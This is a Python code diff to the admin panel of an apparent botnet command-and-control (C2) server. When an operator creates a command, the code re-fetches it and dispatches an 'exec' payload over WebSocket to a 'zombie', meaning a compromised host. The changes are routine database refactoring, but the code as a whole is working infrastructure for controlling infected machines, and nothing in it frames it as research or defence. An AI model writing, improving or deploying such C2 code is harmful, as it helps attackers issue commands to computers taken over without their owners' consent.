@@ -59,26 +59,29 @@ class CommandAdmin(ModelView, model=Command):
 
     async def after_model_change(self, data: dict, model: Command, is_created: bool, request: Request) -> None:
         from managers.c2_manager import c2_manager
-        print(data)
+        # print(data)
 
         if is_created:
-            # IMPORTANT: Re-fetch the model with zombie loaded to avoid DetachedInstanceError
             async with async_session_maker() as session:
-                query = (
-                    select(Command)
-                    .options(selectinload(Command.zombie))
-                    .where(Command.id == model.id)
+                # Optimized: session.get is cleaner for ID lookups
+                full_command = await session.get(
+                    Command, 
+                    model.id, 
+                    options=[selectinload(Command.zombie)]
                 )
-                result = await session.execute(query)
-                full_command: Command = result.scalar_one()
-                payload = {
-                    "command_type": full_command.command_type,
-                    "command_id": full_command.id,
-                }
-            # Pass the loaded object or a dictionary to the manager
-            # We use full_command.zombie_id as the key for our WebSocket dictionary
-            await c2_manager.send_command(str(full_command.zombie_id), payload)
-            print(f"[*] Command #{full_command.id} dispatched to Zombie {full_command.zombie_id}")
+
+                if full_command:
+                    payload = {
+                        "action":'exec',
+                        "command_type": full_command.command_type,
+                        "command_id": str(full_command.id), # UUIDs/BigInts are safer as strings in JSON
+                    }
+
+                    # Dispatching INSIDE the session block ensures data integrity
+                    await c2_manager.send_command(str(full_command.zombie_id), payload)
+                    print(f"[*] Command #{full_command.id} dispatched to Zombie {full_command.zombie_id}")
+                else:
+                    print(f"[!] Failed to re-fetch command {model.id}")
 
 
 class LogAdmin(ModelView, model=Log):
